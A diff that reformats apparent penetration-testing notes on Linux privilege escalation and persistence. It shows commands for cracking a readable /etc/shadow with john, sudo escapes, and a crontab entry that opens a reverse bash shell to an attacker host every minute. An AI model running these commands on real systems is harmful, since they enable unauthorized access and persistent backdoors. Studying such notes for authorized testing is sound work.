@@ -642,24 +642,21 @@ automated scan:
 
 Already there are many commands I Have written previously in the linux enumeration section.
 
-1) Weak permissions: REadable etc/shadow file
+1. Weak permissions: REadable etc/shadow file
+
 ```bash
 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 ```
 
-2) Weak permission(writable): mkpasswd -m sha-512 newpasswordhere
+2. Weak permission(writable): mkpasswd -m sha-512 newpasswordhere
 
-3) Sudo shell escapes: 
+3. Sudo shell escapes:
+
 ```bash
 sudo -l
 ```
 
-Visit gfto bins for escapes 
-
-
-
-
-
+Visit gfto bins for escapes
 
 ## Linux persistence
 
@@ -676,14 +673,7 @@ run the following command
 echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/(attacker ip)/(attacker port) 0>&1'" > cron
 crontab -i cron
 ```
+
 After this cron will set up and you can use the netcat listner to connect to it whenver you want
 
-
-
-
-  
-
-
-
-
-
+This is the end of it.
